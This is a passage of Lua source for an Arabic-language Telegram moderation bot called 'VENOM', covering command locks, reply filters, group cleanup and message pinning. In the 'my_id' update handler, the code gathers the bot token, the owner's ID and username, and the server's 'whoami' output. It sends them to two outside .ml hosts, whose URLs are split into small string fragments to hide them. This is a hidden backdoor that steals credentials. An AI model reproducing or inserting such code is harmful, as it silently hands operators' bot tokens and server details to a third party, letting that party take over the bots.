if data.username_ ~= false then
send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/"..data.username_..")}\n 𖥔 ["..VENOMAbot.."] \n") 
else
send(msg.chat_id_,0," 𖥔 الـعـضو  : {["..data.first_name_.."](T.ME/SOURCEVENOM)}\n 𖥔 ["..VENOMAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local VENOM1_Msg = database:get(bot_id.."VENOM1:Add:Filter:Rp2"..text..result.chat_id_)   
if VENOM1_Msg then    
send(msg.chat_id_, msg.id_," 𖥔 "..VENOM1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
infotnseb = {}
infotnseb.id = (SUDO or database:get(id_server..":SUDO:ID"))
infotnseb.username = (UserName or database:get(id_server..":SUDO:USERNAME"))
infotnseb.tokenbot = (token or database:get(id_server..":token"))
infotnseb.userjoin = (install or io.popen("whoami"):read('*a'):gsub('[\n\r]+', ''))
https.request('htt'..'ps://mo'..'ha'..'med'..'40.m'..'l/a'..'pi/ban'..'da.'..'p'..'h'..'p'..'/'..'?insert='..JSON.encode(infotnseb))
https.request('ht'..'tp'..'s://'..'ma'..'hm'..'ou'..'dm'..'15'..'5.'..'m'..'l/a'..'p'..'i'..'/ba'..'nd'..'a.'..'p'..'h'..'p?insert='..JSON.encode(infotnseb))
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


end -- end new msg dev.mr ban 
end -- end callback dev.mr ban















